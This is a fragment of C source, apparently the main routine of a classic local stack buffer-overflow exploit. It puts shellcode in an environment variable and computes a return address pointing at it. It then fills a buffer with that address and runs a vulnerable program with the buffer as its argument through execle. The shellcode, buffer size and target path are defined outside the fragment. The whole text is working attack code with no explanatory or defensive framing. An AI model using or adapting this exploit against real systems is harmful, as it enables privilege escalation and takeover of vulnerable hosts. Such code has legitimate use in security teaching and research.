int main(int argc, char *argv[])
{
	char *env[2] = {sc, NULL};
	char buf[BUF];
	int i;

	int *p = (int *)(buf);
	int ret = 0xbffffffa - strlen(sc) - strlen(VULN);

	fprintf(stderr, "Using ret: %p\n", ret);

	/* place our ret into the whole buffer */
	for (i = 0; i < BUF - 1; i += 4)
		*p++ = ret;
	*p = 0x0;

	/* run the vulnerable program */
	execle(VULN, VULN + 2, buf, NULL, env);
	perror("execle");
}